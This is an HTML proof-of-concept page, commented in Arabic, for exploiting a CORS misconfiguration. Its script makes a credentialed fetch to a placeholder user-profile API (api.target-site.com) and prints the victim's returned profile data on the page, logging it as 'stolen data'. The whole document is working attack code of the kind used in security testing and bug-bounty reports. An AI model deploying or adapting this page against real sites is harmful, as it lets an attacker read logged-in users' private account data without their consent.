<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC Exploit</title>
</head>
<body>
    <h1>CORS Vulnerability Test</h1>
    <div id="result">بانتظار جلب البيانات...</div>

    <script>
        // رابط الـ API الذي يحتوي على الثغرة
        const targetUrl = "https://api.target-site.com/user/profile"; 

        fetch(targetUrl, {
            method: 'GET',
            // إرسال الكوكيز وبيانات الاعتماد هو جوهر الثغرة هنا
            credentials: 'include' 
        })
        .then(response => response.json())
        .then(data => {
            console.log("تمت سرقة البيانات:", data);
            document.getElementById('result').innerHTML = 
                "<h3>تم سحب البيانات بنجاح:</h3>" + 
                "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
        })
        .catch(error => {
            console.error("فشل الطلب:", error);
            document.getElementById('result').innerText = "فشل الطلب. قد لا تكون الثغرة قابلة للاستغلال من هذا المنشأ.";
        });
    </script>
</body>
</html>
